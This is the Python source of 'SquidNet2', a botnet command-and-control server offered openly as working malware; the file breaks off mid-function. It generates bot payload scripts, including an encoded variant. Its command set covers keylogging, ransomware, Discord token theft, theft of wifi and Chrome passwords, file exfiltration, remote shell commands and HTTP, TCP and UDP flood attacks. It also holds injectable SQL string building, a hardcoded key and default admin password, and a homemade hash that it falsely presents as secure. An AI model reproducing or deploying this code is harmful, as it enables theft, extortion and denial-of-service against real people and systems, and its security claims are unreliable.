#!/usr/local/bin/python3
import socket, threading, hashlib, os, time, sqlite3, shutil, urllib.request, json, sys, base64
from optparse import OptionParser
from datetime import datetime
class SquidNet:
    """
    # SquidNet2 - The sequel to SquidNet that nobody asked for, but everyone needed. 
    
    Main Class for the BotNet. Every single line of server code, payload code is inside of this class.
    There are many functions inside of the class, where they have many different uses. They vary in usefullness
    and effectiveness, nonetheless they all contribute to the overall functioning of the server. It uses a lot
    of logic and similar code from DatCord, which was a server that truly displayed my advancements in network
    programming, where it also is an improvement from the previous SquidNet. SquidNet2 does not have as many bugs,
    and also not as many useless functions.
    
    # To Do List
    - Add a function that allows the possession of all the bot's keyboards.
        - Mess with them a little bit >:)
    - ✓ Make things look a more pleasing to the eye.
    - ✓ Add some more developer notes for extra guidance for curious people looking at the source code.
        - Educate some people :)
    - ✓ Upgrade hashing algorithm(sha256 is too easy to crack)
        - SquidNet2 is less hackable and more secure.
    - Add Packet Encryption?
    - More customizability
    - ✓ Make things a little hidden for victims
    - ✓ Utilize properties"""
    @property
    def logo(self=None):
        """
        # SquidNet2's Logo
        
        Logo of the script, nothing too special here."""
        logo = """
                                  /\\
                                 //\\\\
                                //__\\\\
                               //____\\\\
                               \\\____//
                                \\\__//
                                [|__|]
                                [|__|]
                                [|__|]
                                [|__|]
                                [|__|]
                                [|__|]
                                [|__|]
                     /)         [|__|]        (\\
                    //\_________[|__|]________/\\\\
                    ))__________||__||_________((
                   <_/         [  \/  ]        \_>
                               || || ||
                               || || ||
                               || || ||
                               || || ||
                               || || ||
                               || || ||
  _________            .__    .||_||_||__          __  ________         .________   _______   
 /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  _|   ____/   \   _  \  
 \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ /____  \    /  /_\  \ 
 /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   //       \   \  \_/   \\
/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_//______  / /\ \_____  /
        \/    |__|             \/ || ||  \/     \/             \/             \/  \/       \/ 
                               || || ||
                               || || ||
                               || || ||
                               || || ||
                               || || ||
                               || || ||
                               \\\ || //
                                \\\||//
                                 \\\//
                             ____-\/-____
                                 -__-
                                /    \\
[+] Botnet By DrSquid
[+] Github: https://github.com/DrSquidX"""
        return logo
    def __init__(self, ip, port, version="5.0", external_ip=None, external_port=None, admin_user="admin", admin_pass="adminpassword12345", logfile="log.txt", enc_key=b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=', ftp_dir="Bot_Files", ransomware_active=True, injectfile=None):
        """
        # __init__() -> The initiation of the SquidNet

        Initiation of the class. Most of every important variable is mentioned here. This function is very important, 
        as it has the definitions of all of the important variables needed for functionality, and also for specification 
        of different things. Many things are defined here, such as the socket that will be used to handle all of the connections, 
        as well as all of the smaller, yet very important variables that would hinder the performace and functionality of 
        the script, if they were to be missing. There is also the use of some functions, as they are needed to help configure
        different things inside of the server."""
        self.ip = ip
        self.port = int(port)
        self.downloading = False
        self.ddosing = False
        self.enc_key = enc_key
        self.botdownload = None
        self.ftp_dir = ftp_dir
        self.ransomware_active = ransomware_active
        self.external_ip = external_ip
        self.external_port = external_port
        self.admin_online = False
        self.logfile = logfile
        self.sqlfilename = "Server.db"
        self.filetransfer = False
        self.sqlconnected = False
        self.sending_file = False
        self.auto_ban = False
        self.keylogging = False
        self.botinfofile = "botinfo.txt"
        self.timetoautoban = 0
        self.injectfile = injectfile
        self._inject = ""
        working_inject = False
        if self.injectfile is not None:
            self._inject = open(self.injectfile,"r").read()
            working_inject = True
        if self.botinfofile not in os.listdir():
            botinfo = open(self.botinfofile,"w").close()
        self.max_connpersec = 20
        self.connpersec = 0
        self.conncount = 0
        self.timer = 1
        self.conf_dbfile()
        file = open(self.logfile, "w").close()
        self.log(self.logo)
        self.version = version
        if self.external_ip is None:
            self.external_ip = self.ip
        if self.external_port is None:
            self.external_port = self.port
        if self.ransomware_active:
            self.quot = ""
        else:
            self.quot = "'''"
        self._payload = self.payload
        self.payloadfile = open("SquidBot.py","w")
        self.payloadfile.write(self._payload[1])
        self.payloadfile.close()
        self.encoded_payload = open("SquidBot_b64.py","w")
        self.encoded_payload.write(self._payload[0])
        self.encoded_payload.close()
        if self.ftp_dir not in os.listdir():
            os.mkdir(self.ftp_dir)
        self.log(f"""[({datetime.today()})][(INFO)]: Server Started on {self.ip}:{self.port}
[({datetime.today()})][(INFO)]: Bots/Admins will connect to: {self.external_ip}:{self.external_port}
[({datetime.today()})][(INFO)]: Payload Bot Script Generated in '{os.path.join(os.getcwd(), self.payloadfile.name)}'
[({datetime.today()})][(INFO)]: Encoded Payload Bot Script Generated in '{os.path.join(os.getcwd(), self.encoded_payload.name)}'(do not use this with py2exe, use the normal payload)"""
+(f"\n[({datetime.today()})][(INFO)]: File '{self.injectfile}' has been inserted into the payloads" if working_inject else "")+"""""")
        self.botnum = 1
        self.connlist = []
        self.botinfo = []
        self.adminconn = None
        self.focusing = False
        self.focus_conn = None
        self.focus_botname = ""
        self.admin_username = admin_user
        self.admin_password = self.Squidhash(admin_pass)
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shutil.copyfile(os.path.join(os.getcwd(),self.payloadfile.name), os.path.join(os.getcwd(),self.ftp_dir,self.payloadfile.name))
        self.log(f"[({datetime.today()})][(SERVER)]: Payload file has been transferred to the FTP directory(for extraction of Admin).")
        self.ipsqlfile = "iplists.db"
        self.ipsqlfile = os.path.join(os.getcwd(),self.ipsqlfile)
        self.max_connpersec = 5
        self.timer = 0
        self.connpersec = 0
        self.conncount = 0
        self.waiting_ban = False
        self.time_to_auto_ban = 2
        self.banning = False
        self.conf_db()
        self.WebInterface = self.Webserver()
        weblistening = threading.Thread(target=self.Weblisten)
        weblistening.start()
    @property
    def botname_list(self):
        botnames = [i[0] for i in self.botinfo]
        return botnames
    @property
    def banlist(self):
        """Gets all of the IP addresses in the IP banlist."""
        return self.get_list("ban")
    @property
    def whitelist(self):
        """Gets all of the IP addresses in the IP whitelist."""
        return self.get_list("white")
    @property
    def help_msg(self):
        """
        # Standard Help Message for admins

        The help message sent to the admins if they request it. It contains all of the information about
        the commands, and also the commands themselves. The arguements are provided, so that the user can
        get a sense of how to actually use the commands effectively."""
        return """\n[(SERVER)]: Info about each command:
[+] Utilities:
[+] !whitelistip <ip>                        - Adds an IP to the whitelist, allowing them to connect to the server during a DDoS Attack.
[+] !unwhitelistip <ip>                      - Removes an IP from the whitelist.
[+] !banip <ip>                              - Bans an IP from the server, therefore having them kicked every time they try to connect to the server.
[+] !unbanip <ip>                            - Unbans an IP from the server.
[+] !focusconn <botname>                     - Only be able to send or see messages from a single bot.
[+] !stopfocus                               - Stops focus mode.
[+] !getipwhitelist                          - Obtains the list of the IP Addresses in the Whitelist.
[+] !getipbanlist                            - Obtains the list of the IP Addresses in the Banlist.
[+] !getbotinfo                              - Displays information from each of the bots.
[+] !help                                    - Displays this message.
[+] !startftp                                - Start file transfer protocol between the admin and the server(to get any transferred Bot Files).
[+] !togglelisten                            - Toggles the setting for the server to listen for connections or not.
[+] !exit                                    - Leave the SquidNet cleanly.
[+] Bot Commands:                
[+] !filedownload <file>                     - Download a file on a single bot computer(requires focus mode).
[+] !download <file> <link>                  - Make the bot download a file from the internet.
[+] !mkdir <dir>                             - Create a folder inside of the bots working directory.
[+] !delfolder <dir>                         - Remove a folder inside of the bots working directory.
[+] !createfile <filename>                   - Create a file in the bots.
[+] !delfile <filename>                      - Delete a file in the bots.
[+] !encfile <filename>                      - Encrypt a file inside of the bots.
[+] !decrypt <filename>                      - Decrypt a file that has been encrypted.
[+] !open <filename>                         - Open a file inside of the bots working directory.
[+] !viewfilecontent <file>                  - View the contents of a file in the bots directory.
[+] !writefile <filename>                    - Open and write inside of a file inside of the bots.
[+] !renamefile <filename> <newname>         - Renames a file on the bot computer.
[+] !sqlconnect <sqlfile>                    - Connect to a Sqlite3 Compatable Database file in the bots.
[+] !changedir <dir>                         - Changes the bots working directory to the one specified(use '%user%' as the user for multiple bots).
[+] !stopsql                                 - Disconnect from the connected Database file.
[+] !stopwrite                               - Close writing mode and return to normal.
[+] !getcwd                                  - Get the current directory of the bots.
[+] !keylog                                  - Activate keylogging to see the bots keystrokes.
[+] !stopkeylog                              - Stops the keylogging.
[+] !listdir                                 - List all of the items in the bots working directory.
[+] !ransomware                              - Activates the ransomware program inside of the bots.
[+] !getdiscordtoken                         - Gets the users Discord token if it exists.
[+] !getwifipass                             - Gets the users saved wifi passwords(windows only).
[+] !getpasswords                            - Takes the passwords from the 'User Data' chrome file(windows only).
[+] DDoS Attack Commands:
[+] !httpflood <website> <delay>             - Make the bots conduct an HTTP Flood Attack on the specified Website.
[+] !tcpflood <ip> <port> <delay> <pkt_size> - Make the bots concuct a TCP Flood Attack on the specified IP and Port.
[+] !udpflood <ip> <port> <delay> <pkt_size> - Make the bots concuct a UDP Flood Attack on the specified IP and Port.
[+] !stopatk                                 - Stops the current DDoS Attack that is happening(only one can happen at a time).
[+] Note: Any other instructions will be run as shell commands on the remote computers."""
    @property
    def file_transfer_help_msg(self):
        """
        # FTP help message for admins

        If the user decides to go onto FTP mode, they will be able to extract files that were extracted
        from the server via the connected bots. This is the help message sent to the user, if they request help.
        Like the previous help message, it has all the commands and the information and parameters about them,
        for the user to use these commands effectively."""
        return """\n[(SERVER)]: Info about each command in FTP Mode.
[+] !help                                    - Displays this message.
[+] !fileinfo                                - Displays all of the files inside of Server's directory.
[+] !download [filename]                     - Downloads a specified file inside of the Server's directory.
[+] !listdir                                 - Gets all of the files inside of the Server's directory.
[+] !stopftp                                 - Return to the Botnet and controlling the bots.
[+] Note: You will be unable to send messages to the bots in FTP Mode. You can return to normal by inputting '!stopftp'.
        """
    def start(self):
        """This function is vital for the functionality of the server, because it actually starts it! 
        It simply tries to bind the server to the IP and Port that were provided in the config file.
        If it doesn't work, an error message will be displayed, so that the user can get a sense of
        the problem."""
        working = False
        try:
            self.server.bind((self.ip, self.port))
            working = True
        except Exception as e:
            self.log(f"[({datetime.today()})][(ERROR)]: There was an error with binding the server: {e}. Check if your configuration was correct.")
        if working:
            self.listener = threading.Thread(target=self.listen).start()
    def conf_db(self):
        """Configures the IP Database so that it could store IP Addresses on an SQLite3 database."""
        try:
            file = open(self.ipsqlfile, "rb")
        except:
            file = open(self.ipsqlfile,"wb")
        file.close()
        self.exec_sql_cmd(self.ipsqlfile, "create table if not exists ipbanlist(ipaddr)")
        self.exec_sql_cmd(self.ipsqlfile, "create table if not exists ipwhitelist(ipaddr)")
    def add_to_ls(self, ltype, ip):
        """Adds a specified IP address from the specified list type(specified in arguements)."""
        self.exec_sql_cmd(self.ipsqlfile, f"insert into ip{ltype}list values('{ip}')")
    def rem_fr_ls(self, ltype, ip):
        """Removes a specified IP address from the specified list type(specified in arguements)."""
        self.exec_sql_cmd(self.ipsqlfile, f"delete from ip{ltype}list where ipaddr = '{ip}'")
    def get_list(self, ltype):
        """Gets a list of IP Addresses through the specified type(specified in the `ltype` argument.)"""
        ls = self.exec_sql_cmd(self.ipsqlfile, f"select ipaddr from ip{ltype}list")
        return [i[0] for i in ls]
    def add_to_whitelist(self, ip):
        """Adds an IP Address to the IP whitelist."""
        self.add_to_ls("white",ip)
    def add_to_banlist(self, ip):
        """Adds an IP Address to the IP banlist."""
        self.add_to_ls("ban",ip)
    def rem_fr_whitelist(self, ip):
        """Removes an IP Address from the IP whitelist."""
        self.rem_fr_ls("white",ip)
    def rem_fr_banlist(self, ip):
        """Removes an IP Address from the IP banlist."""
        self.rem_fr_ls("ban",ip)
    def reset_timer(self):
        """Resets the `self.conncount` and `self.timer` variable, so that division between 
        the amount of connections stays within 'connections per 30 seconds' and thus making 
        the `self.connpersec` variable calculation accurate."""
        while True:
            time.sleep(30)
            self.timer = 1
            self.conncount = 0
    def add_to_timer(self):
        """Adds 1 to the `self.timer` variable every second; so it is basically just a timer."""
        while True:
            time.sleep(1)
            self.timer += 1
    def autobantimer(self, autobantime):
        """If the `self.banning` variable is `False` and the maximum connections per second(referenced
        in the `self.mac_connpersec` variable) is exceeded, there is a timer of `autobantime`(arguement)
        which waits for the specified amount of seconds. If the connections per second is still above
        the configured maximum, then the automatic IP Banning system will take place."""
        time.sleep(autobantime)
        if self.connpersec >= self.max_connpersec:
            self.log("[(ANTI_DOS)] Banning all non-whitelisted IPs.")
            self.banning = True
    def listen(self):
        """
        # The New and Improved Listening Function
        
        Improved listening function for the server(Added v4.7). It has more adjustments and is also more optimised. 
        It uses the Anti-DoS System that is used for other scripts that I am developing.
        
        # Overall Description(Taken from original `self.listen()` function)

        A very important function for the server. It listens to all of the connections, if it is able to, as 
        the `self.listening` variable can be toggled on and off, making the server unable to listen for connections. 
        It also has some of the Anti-DDoS code, where it also closes any connections inside of the banlist, and 
        allows connections in the whitelist into the server without any interruption."""
        self.log(f'[({datetime.today()})][(LISTEN)]: Server is listening.....')
        self.resetter = threading.Thread(target=self.reset_timer).start()
        self.adder = threading.Thread(target=self.add_to_timer).start()
        self.listening = True
        while True:
            try:
                if self.listening:
                    kicked = False
                    self.server.listen()
                    conn, ip = self.server.accept()
                    if self.listening:
                        if ip[0] in self.banlist:
                            kicked = True
                            conn.close()
                        else:
                            self.conncount += 1
                            if self.connpersec > self.max_connpersec:
                                self.connpersec = self.max_connpersec + 5
                            if not self.banning:
                                if self.connpersec > self.max_connpersec and not self.waiting_ban:
                                    self.log(f"[({datetime.today()})][(DDOS_WARN)]: Possible DDoS Attack! Starting Autoban timer.")
                                    self.waiting_ban = True
                                    try_autoban = threading.Thread(target=self.autobantimer, args=(self.time_to_auto_ban,))
                                    try_autoban.start()
                            else:
                                if ip[0] not in self.whitelist:
                                    kicked = True
                                    if ip[0] not in self.banlist:
                                        self.log(f"[({datetime.today()})][(BAN)]: Banning {ip[0]} from the server, as they connected during the DDoS Attack.")
                                        self.add_to_banlist(ip[0])
                            if not kicked:
                                conn.send(f"SquidNet Server v{self.version}".encode())
                                handler = threading.Thread(target=self.handle, args=(conn, ip))
                                handler.start()
                            else:
                                conn.close()
                            self.connpersec = self.conncount / self.timer
                    else:
                        conn.close()
            except Exception as e:
                if "division by zero" not in str(e):
                    self.log(f"[(ERROR)]: {e}")
    def exec_sql_cmd(self, file, cmd):
        """Optimization code made for executing commands on db files. The reason it was made was for optimization
        purposes. This excerpt of code would be pretty much all over the place in this script if it weren't a
        function, and it would make the script look less elegant and clean with all of the repitition."""
        output = ""
        try:
            db = sqlite3.connect(file)
            cursor = db.cursor()
            cursor.execute(cmd)
            output = cursor.fetchall()
            db.commit()
            cursor.close()
            db.close()
        except Exception as e:
            self.log(f"[({datetime.today()})][(RESETSQL)]: Error with SQL Database file '{self.sqlfilename}': {e}, reconfiguring as a precaution.")
            self.conf_dbfile()
        return output
    def conf_dbfile(self):
        """
        # Warning! 
        This function will be deprecated in future versions as there is a new listening function that makes this one obselete(as of v4.7).
        
        This function helps configure the database file that contains the IP whitelists and banlists.
        As you can see, there is the previous function that was used to optimize the code. What the function
        truly does, is create the Database file if it doesn't already exist, and create the tables containing
        the IP banlist and whitelist if they do not exist."""
        try:
            file = open(self.sqlfilename,"rb")
        except:
            file = open(self.sqlfilename,"wb")
        file.close()
        self.exec_sql_cmd(self.sqlfilename, "create table if not exists ipbanlist(ip)")
        self.exec_sql_cmd(self.sqlfilename, "create table if not exists ipallowlist(ip)")
    def return_iplist(self, list_type):
        """
        # Warning! 
        This function will be deprecated in future versions as there is a new listening function that makes this one obselete(as of v4.7).
        
        This gets a list of the IPs, although you need to specify whether it is from the IP Whitelist
        or the Banlist."""
        banned_ips = self.exec_sql_cmd(self.sqlfilename, f"select ip from ip{list_type}list")
        new_ip_list = []
        for i in banned_ips:
            new_ip_list.append(i[0])
        return new_ip_list
    def add_ip(self, ip, list_type):
        """
        # Warning! 
        This function will be deprecated in future versions as there is a new listening function that makes this one obselete(as of v4.7).
        
        This adds an IP to the specified list type(either Whitelist or Banlist)"""
        self.exec_sql_cmd(self.sqlfilename, f"insert into ip{list_type}list values('{ip}')")
    def remove_ip(self, ip, list_type):
        """
        # Warning! 
        This function will be deprecated in future versions as there is a new listening function that makes this one obselete(as of v4.7).
        
        This removes an IP to the specified list type(either Whitelist or Banlist)"""
        self.exec_sql_cmd(self.sqlfilename, f"delete from ip{list_type}list where ip = '{ip}'")
    def conn_persec_timer(self):
        """
        # Warning! 
        This function will be deprecated in future versions as there is a new listening function that makes this one obselete(as of v4.7).
        
        Function used for the not-so-perfect Anti-DDoS System. It measure the connections  per second, and 
        decides whether to take action against them(by that I mean banning them)."""
        while True:
            time.sleep(1)
            self.timer += 1
            if self.connpersec >= self.max_connpersec:
                self.connpersec = self.max_connpersec + 5
            if self.max_connpersec <= self.connpersec:
                self.timetoautoban += 1
                if not self.auto_ban and self.timetoautoban >= 2:
                    self.log(f"[({datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: True")
                    self.auto_ban = True
            else:
                if self.auto_ban:
                    self.log(f"[({datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: False")
                    self.auto_ban = False
                self.timetoautoban = 0
            if self.timer >= 60:
                self.timer = 1
                self.connpersec = 1
                self.conncount = 0
            try:
                self.connpersec = self.conncount / self.timer
            except:
                pass
    def config_conn_vars(self):
        """
        # Warning! 
        This function will be deprecated in future versions as there is a new listening function that makes this one obselete(as of v4.7).

        Optimization code made for less repitition."""
        self.connpersec = self.conncount / self.timer
        if self.connpersec >= self.max_connpersec:
            self.connpersec = self.max_connpersec + 5
        self.conncount += 1
        if self.max_connpersec <= self.connpersec:
            if not self.auto_ban and self.timetoautoban >= 2:
                self.log(f"[({datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: True")
                self.auto_ban = True
        else:
            if self.auto_ban:
                self.log(f"[({datetime.today()})][(ANTI_DDOS)]: Setting 'self.auto_ban' variable to: False")
                self.auto_ban = False
            self.timetoautoban = 0
    def _listen(self):
        """
        # Warning! 
        This function will be deprecated in future versions as there is a new listening function that makes this one obselete(as of v4.7).
        
        A very important function for the server. It listens to all of the connections, if it is able to, as 
        the 'self.listening' variable can be toggled on and off, making the server unable to listen for connections. 
        It also has some of the Anti-DDoS code, where it also closes any connections inside of the banlist, and 
        allows connections in the whitelist into the server without any interruption."""
        self.log(f'[({datetime.today()})][(DEPRECATION_WARNING)]: You are using an outdated function in the SquidNet! You should use "self.listen()" instead of "self._listen()".')
        self.log(f'[({datetime.today()})][(LISTEN)]: Server is listening.....')
        self.listening = True
        connpersectimer = threading.Thread(target=self.conn_persec_timer)
        connpersectimer.start()
        while True:
            if self.listening:
                try:
                    self.server.listen()
                    conn, ip = self.server.accept()
                    if self.connpersec >= self.max_connpersec:
                        self.connpersec = self.max_connpersec + 5
                    if self.listening:
                        kicked = False
                        if ip[0] in self.return_iplist("ban"):
                            conn.close()
                            kicked = True
                        else:
                            if self.auto_ban:
                                if ip[0] in self.return_iplist("allow"):
                                    self.config_conn_vars()
                                else:
                                    self.log(f"[({datetime.today()})][(BANNING_IP)]: {ip[0]} attempted to join the server during the DDoS Attack, banning as a precaution.")
                                    self.add_ip(ip[0],"ban")
                                    conn.close()
                                    kicked = True
                            else:
                                self.config_conn_vars()
                        if not kicked:
                            conn.send(f"SquidNet Server v{self.version}".encode())
                            handler = threading.Thread(target=self.handle, args=(conn, ip))
                            handler.start()
                    else:
                        conn.close()
                except Exception as e:
                    self.log(f"[({datetime.today()})][(ERROR)]: There was an error with listening for connections: {e}")
    def parse_info_msg(self, infomsg, conn, srcport):
        """There is a message sent by every client to the server, which would contain information about them.
        This include their hostname, IP Address, User, and Operating System. This is mainly for the bots,
        so that the admin would have a sense of the computer they have take control of. It returns a list
        of all of the information, to be used later."""
        try:
            name = f"{infomsg.split()[1]}{self.botnum}"
        except:
            name = f"Bot{self.botnum}"
            self.botnum += 1
        try:
            ip = infomsg.split()[2]
        except:
            ip = "127.0.0.1"
        try:
            osuser = infomsg.split()[3]
        except:
            osuser = "Unknown"
        try:
            os = infomsg.split()[4]
        except:
            os = "Unknown"
        self.botnum += 1
        ogcontent = open(self.botinfofile,"r")
        content = ogcontent.read()
        file = open(self.botinfofile,"w")
        file.write(content)
        file.write(f"\n[+] Botname: {name}\n[+] IP: {ip}\n[+] Src Port: {srcport}\n[+] User: {osuser}\n[+] OS: {os}\n[+] Conn: {conn}\n")
        file.close()
        return [name, ip, srcport, osuser, os, conn]
    def get_filename(self, msg):
        """When there is a file trying to be provided for file transfering(etc), there might be files with names 
        with spaces in them. This is a problem with my old system of file name obtaining, as the filenames with 
        spaces would only have the first word of the file used to create or do something with said file. This 
        function fixes that problem, by returning the actual name of the file."""
        msg = msg.split()
        del msg[0]
        filename = ""
        for i in msg:
            filename += f" {i}"
        return filename.strip()
    def log(self, logitem, display=True):
        """
        # Logging

        Important function, needed for logging. This is so that the Server Owner can see what happened in the 
        server, in case of a crash or bug that needed to be fixed. This helps, as all of the output in the server 
        is the same as the output in the log file. The server owner would be able to see any bugs or issues, or 
        easily anything that happened in the server at all. However, the log file is wiped everytime the server
        restarts(I can easily change that, you can contact me if you want that to happen)."""
        content = ""
        if display:
            print(logitem)
        try:
            file = open(self.logfile, "r")
            content = file.read()
            file.close()
        except Exception as e:
            print(f"[({datetime.today()})][(RESETLOG)]: Error with Log file '{self.logfile}': {e}, reconfiguring as a precaution.")
            content = f"""{self.logo}\n[({datetime.today()})][(RESETLOG)]: Error with Log file '{self.logfile}': {e}, reconfiguring as a precaution."""
        file = open(self.logfile,"w")
        file.write(content+"\n"+logitem)
        file.close()
    def send_to_other(self, sender, reciever, msg, recieverconn, send_raw=False):
        """
        # Optimised direct message sending

        Code for optimizing sending and logging at the same time. It logs the message that is being sent, and 
        it also sends the message to the connection that the sender its trying to send to."""
        item = f"[({datetime.today()})][({sender})--->({reciever})]: {msg}"
        self.log(item)
        if not send_raw:
            recieverconn.send(f"\n[({sender})]: {msg}".encode())
        else:
            recieverconn.send(msg.encode())
    def send_file(self, filename, conn):
        """Function needed for FTP. It sends all of the bytes of the file being transferred to the specified connection, 
        which in this case it will be the server admin due to the function only being used in the transferring of files
         from the server to the server admin."""
        self.sending_file = True
        transferred = True
        try:
            file = open(os.path.join(os.getcwd(),os.path.join(self.ftp_dir,filename)), "rb")
            length = len(open(file.name,"rb").read())
        except Exception as e:
            transferred = False
            length = 0
        conn.send(f"!filesize {length}".encode())
        time.sleep(2)
        while True:
            try:
                sendto = file.read(10240)
                if not sendto:
                    break
                else:
                    conn.send(sendto)
            except Exception as e:
                print(e)
                break
        if transferred:
            time.sleep(1)
            self.send_to_other("SERVER",self.admin_username,"File Transfer completed.", conn)
    def Squidhash(self,hash):
        """
        # The SquidHash Algorithm

        An incredibly low quality hashing algorithm that might not even be considered hashing. It essentially does a larget mix
        of hashing and encoding, and creates a long gibberish packet that can be interpreted by the server to help with 
        authentication. It exists because sha256 is too easy to replicate for offline brute-forcing, and therefore Squidhash is
        a more secure option, as it is less easy to replicate it unless people get access to the algorithm itself.
        """
        more_secure_str = [x for x in list(hashlib.sha512(base64.b64encode(base64.a85encode("".join([hashlib.sha512(x.encode()).hexdigest() for x in "".join([hashlib.sha512(x.encode()).hexdigest() for x in hash])]).encode()))).hexdigest())[30:90]]
        more_secure_str.reverse()
        more_secure_str = [x for x in more_secure_str][20:70]
        more_secure_str.reverse()
        more_secure_str = "".join([x for x in more_secure_str[11:20]])+"".join([x for x in more_secure_str[1:10]])+"".join([x for x in more_secure_str[21:30]])
        more_secure_str = list(base64.a85encode(base64.b64encode(base64.b32encode(base64.b16encode(base64.b85encode(more_secure_str.encode()))))).decode())
        more_secure_str.reverse()
        more_secure_str = base64.a85encode("".join([x for x in list(base64.a85encode(base64.b64encode(base64.b85encode(base64.a85encode(base64.a85encode(base64.a85encode(base64.b32encode(base64.a85encode(base64.b64encode(base64.b16encode(base64.a85encode(base64.b16encode("".join([x for x in more_secure_str[30:120]]).encode()))))))))).hex().encode()))).hex())[2500:5000]]).encode())
        return more_secure_str.decode()
    def handle(self, conn, ip):
        """
        # Client Handling

        Very important function, needed for handling the connections of the clients. The way a bot is recognized 
        is quite simple really. There are many variables that help with the process. The handler first uses the information 
        packet(the one with all of the client information), to see if the bot is a bot or a fake bot. If the information 
        packet is invalid(if it does not start with '!botreg'), the connection will be simply closed. If the packet is 
        valid, the Bot will have the ability to become an admin(if they have the correct credentials). If they are not
        an admin, they cannot do anything to take control of the server, but simply be able to send messages around to 
        the admin and server. If the Bot is trying to be an admin, they can send an authentication message(in this case
        its '!login') followed by the credentials. These credentials are not displayed on the log. For authentication 
        to happen. The username is checked with the server variable to see if they match. If they do, now the passwords 
        need to match. There is password hashing in the server(sha256 hashing algorithm), for further security and to 
        prevent any breaches. The password provided would be hashed into sha256, to see if it matches with the hashed 
        password that the server has. It these all match, access is granted to the admin, where they can now do whatever 
        they want with the bots, whether good or bad. There are many things to do with the assortment of commands that
        are provided.
        
        If you want to use the original functions for the IP Database(they will be deprecated in future versions):
        * `self.add_to_banlist(ip)` -> `self.add_ip(ip, "ban")`
        * `self.add_to_whitelist(ip)` -> `self.add_ip(ip,"allow")`
        * `self.rem_fr_banlist(ip)` -> `self.remove_ip(ip, "ban")`
        * `self.rem_fr_whitelist(ip)` -> `self.remove_ip(ip,"allow")`
        * `self.whitelist` -> `self.return_iplist("allow")`
        * `self.banlist` -> `self.return_iplist("ban")`
        """
        bot = False
        name = ip
        admin = False
        registered = False
        filesize = 0
        bytesrecv = 0
        failed_auth = 0
        while True:
            try:
                display_single_msg = True
                msg_from_bot = conn.recv(10240)
                try:
                    msg = str(msg_from_bot.decode()).strip()
                except:
                    msg = str(msg)
                if msg.strip() != "":
                    if not bot:
                        info_packet = msg
                        if not info_packet.startswith("!botreg"):
                            conn.close()
                            break
                        else:
                            self.connlist.append(conn)
                            info = self.parse_info_msg(msg, conn, ip[1])
                            self.botinfo.append(info)
                            name = info[0]
                            ipaddr = info[2]
                            if ipaddr in self.return_iplist("ban"):
                                conn.close()
                                break
                            registered = True
                            original_name = name
                            self.log(f"[({datetime.today()})][(BOTJOIN)]: Bot {name} has joined the botnet.")
                            try:
                                self.adminconn.send(f"\n[(SERVER)]: Bot {name} has joined the botnet.".encode())
                            except:
                                pass
                            bot = True
                    elif bot:
                        if not admin:
                            if msg.startswith("!login"):
                                if not self.admin_online:
                                    try:
                                        username = msg.split()[1]
                                        password = msg.split()[2]
                                        if username == self.admin_username and self.Squidhash(password) == self.admin_password:
                                            self.log(f"[({datetime.today()})][(INFO)]: A new admin session has been created.")
                                            name = self.admin_username
                                            admin = True
                                            self.adminconn = conn
                                            self.admin_online = True
                                            self.send_to_other("SERVER",name,"Successfully logged into the Botnet. You have access to all of the bots.", conn)
                                            self.send_to_other("SERVER",name,"Input '!help' if you need more info on the commands.", conn)
                                            for i in self.botinfo:
                                                if i[0] == original_name:
                                                    self.botinfo.remove(i)
                                                    break
                                        else:
                                            self.send_to_other("SERVER",name,"Authentication Failed.", conn)
                                            failed_auth += 1
                                            if failed_auth >= 3:
                                                self.log(f"[({datetime.today()})][(AUTH_KICK)]: Kicked Bot '{name}' due to 3 failed authentication attempts!")
                                                conn.close()
                                    except:
                                        pass
                                else:
                                    self.send_to_other("SERVER",name,"There is already an active owner session. Please wait until they log off.", conn)
                            elif msg.startswith("!key") and self.keylogging:
                                try:
                                    keystroke = msg.split()[1]
                                    keyfile = open(name+".txt","r")
                                    content = keyfile.read()
                                    keyfile.close()
                                    newkeyfile = open(name+".txt","w")
                                    newkeyfile.write(content)
                                    newkeyfile.write(f"\n[+] {keystroke}")
                                    newkeyfile.close()
                                except:
                                    pass
                            else:
                                try:
                                    display_single_msg = False
                                    if not self.focusing:
                                        display_single_msg = True
                                    else:
                                        if conn == self.focus_conn:
                                            if not self.downloading:
                                                self.send_to_other(name, self.admin_username,msg, self.adminconn)
                                            else:
                                                try:
                                                    if msg.startswith("!filesize"):
                                                        filesize = int(msg.split()[1])
                                                    else:
                                                        bytesrecv += len(msg_from_bot)
                                                        if msg.lower() != "file transfer to server completed.":
                                                            self.botdownload.write(msg_from_bot)
                                                        if bytesrecv >= filesize or msg.lower() == "file transfer to server completed.":
                                                            if msg.lower() == "file transfer to server completed.":
                                                                self.send_to_other(name,self.admin_username,"File transfer to server completed.", self.adminconn)
                                                            bytesrecv = 0
                                                            filesize = 0
                                                            self.downloading = False
                                                            self.botdownload.close()
                                                except Exception as e:
                                                    self.botdownload.write(msg_from_bot)
                                except:
                                    display_single_msg = True
                        elif admin:
                            if not self.filetransfer:
                                if msg.startswith("!help"):
                                    self.log(f"[({datetime.today()})][(SERVER)--->({self.admin_username})]: Sent the help message.")
                                    self.adminconn.send(self.help_msg.encode())
                                elif msg.startswith("!startftp"):
                                    self.send_to_other("SERVER",name, "Activiting FTP mode. You will be able to get files inside of the servers directory(for ex downloaded bot Files).", conn)
                                    self.send_to_other("SERVER",name, "You can input '!help' in case you need to know what commands are there for you.", conn)
                                    self.filetransfer = True
                                elif msg.startswith("!focusconn"):
                                    try:
                                        botname = msg.split()[1]
                                        found = False
                                        for i in self.botinfo:
                                            if i[0] == botname:
                                                self.focus_conn = i[len(i)-1]
                                                found = True
                                        if found:
                                            self.send_to_other("SERVER",name,f"You can now only see output from bot {botname}.", conn)
                                            self.focus_botname = botname
                                            self.focusing = True
                                    except:
                                        self.send_to_other("SERVER",name,"Invalid input! Here is the valid input: !focusconn <botname>", conn)
                                elif msg.startswith("!exit"):
                                    conn.close()
                                    raise Exception("Admin closed connection.")
                                elif msg.startswith("!banip"):
                                    try:
